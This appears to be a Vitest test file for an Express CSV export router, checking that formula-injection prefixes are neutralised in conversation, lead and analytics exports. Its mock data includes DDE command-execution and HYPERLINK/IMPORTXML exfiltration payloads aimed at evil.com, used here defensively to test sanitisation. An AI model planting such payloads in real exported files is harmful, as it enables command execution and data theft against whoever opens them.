import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { Request, Response, NextFunction } from 'express';

// ---------------------------------------------------------------------------
// Mocks — must be declared before importing the router
// ---------------------------------------------------------------------------

vi.mock('../config/database', () => ({
  prisma: {
    conversation: {
      findMany: vi.fn(),
    },
    lead: {
      findMany: vi.fn(),
    },
  },
}));

vi.mock('../services/analytics.service', () => ({
  analyticsService: {
    getOverview: vi.fn(),
  },
}));

vi.mock('../middleware/auth', () => ({
  authenticate: (req: any, res: any, next: any) => next(),
  orgContext: (req: any, res: any, next: any) => next(),
}));

// Import the router and dependencies after mocks are set up
import exportRouter from './export.routes';
import { prisma } from '../config/database';
import { analyticsService } from '../services/analytics.service';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function createMockReqRes(params: Record<string, string> = {}) {
  const req = {
    params: { orgId: 'org-123', ...params },
    query: {},
    headers: {},
  } as unknown as Request;

  const res = {
    setHeader: vi.fn(),
    send: vi.fn(),
    write: vi.fn(),
    end: vi.fn(),
    status: vi.fn().mockReturnThis(),
    json: vi.fn().mockReturnThis(),
  } as unknown as Response;

  const next = vi.fn() as NextFunction;

  return { req, res, next };
}

/** Helper: extract the CSV sent in res.send() or streamed via res.write() */
function getSentCsv(res: Response): string {
  const sendMock = res.send as ReturnType<typeof vi.fn>;
  const writeMock = res.write as ReturnType<typeof vi.fn>;

  // Check if streaming (res.write) was used
  if (writeMock.mock.calls.length > 0) {
    // Collect all chunks from write() calls
    return writeMock.mock.calls.map((call: any) => call[0]).join('');
  }

  // Otherwise, use the old res.send() method
  expect(sendMock).toHaveBeenCalledOnce();
  return sendMock.mock.calls[0][0];
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('export.routes', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // -----------------------------------------------------------------------
  // GET /conversations - CSV formula injection protection
  // -----------------------------------------------------------------------
  describe('GET /conversations', () => {
    it('should export conversations with normal data', async () => {
      const mockConversations = [
        {
          id: 'conv-1',
          customerName: 'John Doe',
          channel: { type: 'web' },
          status: 'ACTIVE',
          messageCount: 5,
          createdAt: new Date('2024-01-01T10:00:00Z'),
          resolvedAt: null,
        },
      ];

      vi.mocked(prisma.conversation.findMany).mockResolvedValue(mockConversations);

      const { req, res, next } = createMockReqRes();

      // Call the route handler directly
      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith('Content-Type', 'text/csv');
      expect(res.setHeader).toHaveBeenCalledWith(
        'Content-Disposition',
        'attachment; filename="conversations-export.csv"'
      );

      const csv = getSentCsv(res);
      expect(csv).toContain('id,customerName,channel,status,messageCount,createdAt,resolvedAt');
      expect(csv).toContain('conv-1,John Doe,web,ACTIVE,5,2024-01-01T10:00:00.000Z,');
    });

    it('should sanitize customerName starting with = (formula injection)', async () => {
      const mockConversations = [
        {
          id: 'conv-malicious',
          customerName: '=CMD|"/C calc"!A0',
          channel: { type: 'web' },
          status: 'ACTIVE',
          messageCount: 1,
          createdAt: new Date('2024-01-01T10:00:00Z'),
          resolvedAt: null,
        },
      ];

      vi.mocked(prisma.conversation.findMany).mockResolvedValue(mockConversations);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The dangerous formula should be prefixed with single quote
      expect(csv).toContain("'=CMD");
    });

    it('should sanitize customerName starting with + (formula injection)', async () => {
      const mockConversations = [
        {
          id: 'conv-2',
          customerName: '+1234567890',
          channel: { type: 'web' },
          status: 'ACTIVE',
          messageCount: 1,
          createdAt: new Date('2024-01-01T10:00:00Z'),
          resolvedAt: null,
        },
      ];

      vi.mocked(prisma.conversation.findMany).mockResolvedValue(mockConversations);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The + at the start should be prefixed with single quote
      expect(csv).toContain("'+1234567890");
    });

    it('should sanitize customerName starting with - (formula injection)', async () => {
      const mockConversations = [
        {
          id: 'conv-3',
          customerName: '-SUM(A1:A10)',
          channel: { type: 'web' },
          status: 'ACTIVE',
          messageCount: 1,
          createdAt: new Date('2024-01-01T10:00:00Z'),
          resolvedAt: null,
        },
      ];

      vi.mocked(prisma.conversation.findMany).mockResolvedValue(mockConversations);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The - at the start should be prefixed with single quote
      expect(csv).toContain("'-SUM");
    });

    it('should sanitize customerName starting with @ (formula injection)', async () => {
      const mockConversations = [
        {
          id: 'conv-4',
          customerName: '@SUM(A1:A10)',
          channel: { type: 'web' },
          status: 'ACTIVE',
          messageCount: 1,
          createdAt: new Date('2024-01-01T10:00:00Z'),
          resolvedAt: null,
        },
      ];

      vi.mocked(prisma.conversation.findMany).mockResolvedValue(mockConversations);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The @ at the start should be prefixed with single quote
      expect(csv).toContain("'@SUM");
    });

    it('should handle null customerName', async () => {
      const mockConversations = [
        {
          id: 'conv-5',
          customerName: null,
          channel: { type: 'web' },
          status: 'ACTIVE',
          messageCount: 1,
          createdAt: new Date('2024-01-01T10:00:00Z'),
          resolvedAt: null,
        },
      ];

      vi.mocked(prisma.conversation.findMany).mockResolvedValue(mockConversations);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // Null should be converted to empty string
      expect(csv).toContain('conv-5,,web,ACTIVE');
    });
  });

  // -----------------------------------------------------------------------
  // GET /leads - CSV formula injection protection
  // -----------------------------------------------------------------------
  describe('GET /leads', () => {
    it('should export leads with normal data', async () => {
      const mockLeads = [
        {
          id: 'lead-1',
          name: 'Jane Smith',
          email: 'jane@example.com',
          phone: '+1234567890',
          status: 'NEW',
          source: 'website',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith('Content-Type', 'text/csv');
      expect(res.setHeader).toHaveBeenCalledWith(
        'Content-Disposition',
        'attachment; filename="leads-export.csv"'
      );

      const csv = getSentCsv(res);
      expect(csv).toContain('id,name,email,phone,status,source,createdAt');
      expect(csv).toContain('lead-1,Jane Smith,jane@example.com');
    });

    it('should sanitize lead name with formula injection (= character)', async () => {
      const mockLeads = [
        {
          id: 'lead-malicious',
          name: '=HYPERLINK("https://evil.com/"&A2,"Click me")',
          email: 'attacker@evil.com',
          phone: null,
          status: 'NEW',
          source: 'form',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The dangerous formula should be prefixed with single quote
      expect(csv).toContain("'=HYPERLINK");
    });

    it('should sanitize lead email with formula injection (+ character)', async () => {
      const mockLeads = [
        {
          id: 'lead-2',
          name: 'Normal Name',
          email: '+attack@test.com',
          phone: null,
          status: 'NEW',
          source: 'api',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The + at the start of email should be prefixed with single quote
      expect(csv).toContain("'+attack@test.com");
    });

    it('should sanitize lead phone with formula injection (- character)', async () => {
      const mockLeads = [
        {
          id: 'lead-3',
          name: 'Test User',
          email: 'test@example.com',
          phone: '-1+1=0',
          status: 'NEW',
          source: 'chat',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The - at the start of phone should be prefixed with single quote
      expect(csv).toContain("'-1+1=0");
    });

    it('should sanitize lead source with formula injection (@ character)', async () => {
      const mockLeads = [
        {
          id: 'lead-4',
          name: 'Test User',
          email: 'test@example.com',
          phone: null,
          status: 'NEW',
          source: '@SUM(1+1)',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The @ at the start of source should be prefixed with single quote
      expect(csv).toContain("'@SUM(1+1)");
    });

    it('should handle multiple malicious fields in a single lead', async () => {
      const mockLeads = [
        {
          id: 'lead-5',
          name: '=malicious',
          email: '+evil@test.com',
          phone: '-attack',
          status: 'NEW',
          source: '@dangerous',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // All dangerous fields should be prefixed with single quote
      expect(csv).toContain("'=malicious");
      expect(csv).toContain("'+evil@test.com");
      expect(csv).toContain("'-attack");
      expect(csv).toContain("'@dangerous");
    });

    it('should handle null values in lead fields', async () => {
      const mockLeads = [
        {
          id: 'lead-6',
          name: null,
          email: null,
          phone: null,
          status: 'NEW',
          source: null,
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // Null values should be converted to empty strings
      expect(csv).toContain('lead-6,,,');
    });
  });

  // -----------------------------------------------------------------------
  // GET /analytics - CSV formula injection protection
  // -----------------------------------------------------------------------
  describe('GET /analytics', () => {
    it('should export analytics with normal data', async () => {
      const mockOverview = {
        totalConversations: 100,
        totalMessages: 500,
        totalLeads: 50,
        activeConversations: 20,
        resolvedConversations: 80,
        averageResponseTimeMs: 1200,
        handoffRate: 0.15,
      };

      vi.mocked(analyticsService.getOverview).mockResolvedValue(mockOverview);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/analytics'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith('Content-Type', 'text/csv');
      expect(res.setHeader).toHaveBeenCalledWith(
        'Content-Disposition',
        'attachment; filename="analytics-export.csv"'
      );

      const csv = getSentCsv(res);
      expect(csv).toContain('metric,value');
      expect(csv).toContain('totalConversations,100');
      expect(csv).toContain('totalMessages,500');
      expect(csv).toContain('handoffRate,0.15');
    });

    it('should handle analytics export without formula injection concerns', async () => {
      // Analytics export contains only metric names and numeric values,
      // so formula injection is not a concern. However, we test to ensure
      // the sanitization function handles these correctly.
      const mockOverview = {
        totalConversations: 999,
        totalMessages: 9999,
        totalLeads: 99,
        activeConversations: 10,
        resolvedConversations: 989,
        averageResponseTimeMs: 500,
        handoffRate: 0.01,
      };

      vi.mocked(analyticsService.getOverview).mockResolvedValue(mockOverview);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/analytics'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // Verify all metrics are present
      expect(csv).toContain('totalConversations,999');
      expect(csv).toContain('totalMessages,9999');
      expect(csv).toContain('totalLeads,99');
      expect(csv).toContain('activeConversations,10');
      expect(csv).toContain('resolvedConversations,989');
    });
  });

  // -----------------------------------------------------------------------
  // Real-world attack payloads
  // -----------------------------------------------------------------------
  describe('real-world attack payloads', () => {
    it('should protect against DDE (Dynamic Data Exchange) attack', async () => {
      const mockConversations = [
        {
          id: 'conv-dde',
          customerName: '=CMD|"/C calc"!A0',
          channel: { type: 'web' },
          status: 'ACTIVE',
          messageCount: 1,
          createdAt: new Date('2024-01-01T10:00:00Z'),
          resolvedAt: null,
        },
      ];

      vi.mocked(prisma.conversation.findMany).mockResolvedValue(mockConversations);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // DDE attack should be neutralized
      expect(csv).toContain("'=CMD");
    });

    it('should protect against HYPERLINK data exfiltration', async () => {
      const mockLeads = [
        {
          id: 'lead-hyperlink',
          name: '=HYPERLINK("https://evil.com/"&A2,"Click")',
          email: 'test@example.com',
          phone: null,
          status: 'NEW',
          source: 'web',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // HYPERLINK attack should be neutralized
      expect(csv).toContain("'=HYPERLINK");
    });

    it('should protect against IMPORTXML remote code execution', async () => {
      const mockLeads = [
        {
          id: 'lead-importxml',
          name: '=IMPORTXML(CONCAT("http://evil.com/?v=",A2),"//a")',
          email: 'test@example.com',
          phone: null,
          status: 'NEW',
          source: 'api',
          createdAt: new Date('2024-01-01T10:00:00Z'),
        },
      ];

      vi.mocked(prisma.lead.findMany).mockResolvedValue(mockLeads);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // IMPORTXML attack should be neutralized
      expect(csv).toContain("'=IMPORTXML");
    });
  });

  // -----------------------------------------------------------------------
  // Error handling
  // -----------------------------------------------------------------------
  describe('error handling', () => {
    it('should call next with error when conversations query fails', async () => {
      const dbError = new Error('Database connection failed');
      vi.mocked(prisma.conversation.findMany).mockRejectedValue(dbError);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/conversations'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      expect(next).toHaveBeenCalledWith(dbError);
      expect(res.send).not.toHaveBeenCalled();
    });

    it('should call next with error when leads query fails', async () => {
      const dbError = new Error('Database connection failed');
      vi.mocked(prisma.lead.findMany).mockRejectedValue(dbError);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/leads'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      expect(next).toHaveBeenCalledWith(dbError);
      expect(res.send).not.toHaveBeenCalled();
    });

    it('should call next with error when analytics service fails', async () => {
      const serviceError = new Error('Analytics service unavailable');
      vi.mocked(analyticsService.getOverview).mockRejectedValue(serviceError);

      const { req, res, next } = createMockReqRes();

      const handler = exportRouter.stack.find(
        (layer: any) => layer.route?.path === '/analytics'
      )?.route?.stack[0].handle;

      await handler(req, res, next);

      expect(next).toHaveBeenCalledWith(serviceError);
      expect(res.send).not.toHaveBeenCalled();
    });
  });
});
